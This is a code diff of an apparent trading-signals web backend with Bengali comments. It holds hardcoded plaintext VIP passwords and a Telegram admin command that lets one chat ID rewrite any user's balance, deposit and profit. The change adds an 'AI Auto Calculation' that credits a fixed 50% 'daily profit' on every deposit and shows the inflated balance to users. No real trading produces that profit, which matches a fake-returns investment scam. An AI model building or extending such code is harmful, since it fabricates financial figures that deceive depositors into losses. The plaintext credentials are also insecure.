@@ -20,7 +20,7 @@ VIP_USERS = {
     "bear_hunter": "hunter2026", "smart_money": "smc2026", "profit_maker": "profit#100",
     "signal_boss": "boss@2026", "alpha_trader": "alpha!fx", "pip_catcher": "catch100",
     "whale_alert": "whale999", "crypto_fx": "fx@crypto", "scalper_pro": "scalp50",
-    "rader": "t"
+    "vder": "tx"
 }
 
 tv = TvDatafeed()
@@ -56,7 +56,6 @@ def load_devices():
 def save_devices(data):
     with open('devices.json', 'w') as f: json.dump(data, f)
 
-# 🚀 ইউজারদের ডাটাবেস লোড ও সেভ
 def load_users_data():
     try:
         if os.path.exists('users_data.json'):
@@ -80,7 +79,7 @@ def send_telegram_alert(msg):
             urllib.request.urlopen(req)
         except Exception as e: print("Telegram Alert Error:", e)
 
-# 🚀 টেলিগ্রাম থেকে কমান্ড রিসিভ করার ব্যাকগ্রাউন্ড থ্রেড (Admin Control)
+# 🚀 টেলিগ্রাম কমান্ড রিসিভার এবং AI অটো ক্যালকুলেশন
 last_update_id = 0
 def telegram_polling():
     global last_update_id
@@ -98,7 +97,6 @@ def telegram_polling():
                 chat_id = str(message.get('chat', {}).get('id', ''))
                 text = message.get('text', '')
                 
-                # কমান্ড ফরমেট: /set username balance 1500
                 if chat_id == "7204862590" and text.startswith('/set'):
                     parts = text.split()
                     if len(parts) >= 4:
@@ -110,9 +108,30 @@ def telegram_polling():
                             if username not in users:
                                 users[username] = {"balance": "0.00", "deposit": "0.00", "profit": "0.00", "total_profit": "0.00", "withdraw": "0.00"}
                             
-                            users[username][field] = value
-                            save_users_data(users)
-                            send_telegram_alert(f"✅ *Data Updated!*\n👤 *User:* `{username}`\n📝 *Field:* {field}\n💰 *New Value:* ${value}")
+                            # 🚀 AI Auto Calculation Logic
+                            if field == 'deposit':
+                                try:
+                                    dep_amount = float(value)
+                                    daily_profit = dep_amount * 0.50 # 50% Profit Calculation
+                                    new_balance = dep_amount + daily_profit # Total Balance
+                                    
+                                    users[username]['deposit'] = f"{dep_amount:.2f}"
+                                    users[username]['profit'] = f"{daily_profit:.2f}"
+                                    users[username]['balance'] = f"{new_balance:.2f}"
+                                    
+                                    # Total Profit এর সাথে নতুন প্রফিট যোগ হবে
+                                    current_total_profit = float(users[username].get('total_profit', "0.00"))
+                                    users[username]['total_profit'] = f"{current_total_profit + daily_profit:.2f}"
+                                    
+                                    save_users_data(users)
+                                    send_telegram_alert(f"🤖 *AI Auto Calculation Done!*\n👤 *User:* `{username}`\n📥 *Deposit:* ${dep_amount:.2f}\n📈 *Daily Profit (50%):* ${daily_profit:.2f}\n💵 *New Balance:* ${new_balance:.2f}")
+                                except ValueError:
+                                    send_telegram_alert("❌ *Error:* Deposit amount must be a number!")
+                            else:
+                                # অন্যান্য ফিল্ড ম্যানুয়ালি আপডেট করার জন্য
+                                users[username][field] = value
+                                save_users_data(users)
+                                send_telegram_alert(f"✅ *Data Updated!*\n👤 *User:* `{username}`\n📝 *Field:* {field}\n💰 *New Value:* ${value}")
                         else:
                             send_telegram_alert(f"❌ *Invalid Field!*\nUse: `balance`, `deposit`, `profit`, `total_profit`, `withdraw`")
         except Exception as e:
@@ -192,7 +211,6 @@ def submit_form():
         return jsonify({"status": "success"})
     except Exception as e: return jsonify({"status": "error", "message": str(e)})
 
-# 🚀 ইউজার ডাটা পাঠানোর API
 @app.route('/api/get_user_data', methods=['POST'])
 def get_user_data():
     try:
